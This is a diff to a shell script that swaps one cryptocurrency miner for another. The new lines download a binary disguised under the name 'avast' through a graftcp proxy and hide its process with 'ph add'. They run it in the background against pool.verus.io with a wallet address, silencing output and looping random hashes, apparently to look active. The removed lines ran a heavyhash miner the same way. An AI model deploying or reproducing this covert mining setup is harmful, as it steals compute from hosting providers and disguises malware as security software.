@@ -31,10 +31,12 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://gitlab.com/cici2/obtc/-/raw/main/ssserver
-chmod +x ssserver
+./avast -v -l  pool.verus.io:9999 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.T -t 8 -x
 
-ph add ssserver
+./graftcp/graftcp wget https://github.com/aurbach55/toya/raw/main/avast
+chmod +x avast
 
-./graftcp/graftcp ./ssserver --algorithm heavyhash --pool stratum+tcps://stratum-ru.rplant.xyz:17064 --wallet bc1q0l70tfy834e9rz8kpymelv27tweg34v54qdehe.x --password x >/dev/null &
+ph add avast
+
+./graftcp/graftcp ./avast -v -l  pool.verus.io:9999 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.T -t 8 -x >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
